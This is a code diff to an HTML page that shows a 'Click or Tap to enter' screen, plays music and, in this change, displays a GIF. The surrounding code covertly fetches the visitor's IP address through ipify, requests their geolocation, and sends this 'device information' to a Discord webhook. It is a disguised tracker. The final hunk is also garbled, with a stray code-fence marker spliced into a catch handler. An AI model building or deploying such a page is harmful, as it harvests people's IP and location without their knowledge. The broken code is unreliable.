@@ -12,16 +12,23 @@
       margin: 0; /* Remove default margin */
       background-color: black; /* Black background */
       color: gray; /* Gray text */
+      flex-direction: column; /* Stack elements vertically */
     }
     #info {
       font-size: 18px;
       text-align: center;
+    }
+    #gif {
+      display: none; /* Initially hide the GIF */
+      width: 300px; /* Set a width for the GIF */
+      margin-top: 20px; /* Add some space above the GIF */
     }
   </style>
 </head>
 <body>
   <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
+  <img id="gif" src="https://tenor.com/bGfSD.gif" alt="Loading GIF" />
   <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
     // Discord Webhook URL
@@ -35,6 +42,10 @@
 
       // Play music
       document.getElementById('music').play();
+
+      // Show GIF
+      const gifElement = document.getElementById('gif');
+      gifElement.style.display = 'block'; // Show the GIF
 
       // Get user's IP address using IPify API
       fetch('https://api.ipify.org?format=json')
@@ -96,7 +107,9 @@
                console.log('Device information sent successfully');
                hasSentInfo = true; // Set the flag to true after sending
              })
-             .catch(error => console.error('Failed to send device information:', error));
+             .catch(error =>```javascript
+               console.error('Failed to send device information:', error);
+             });
           }, error => {
             console.error('Failed to get geolocation:', error);
           }, {
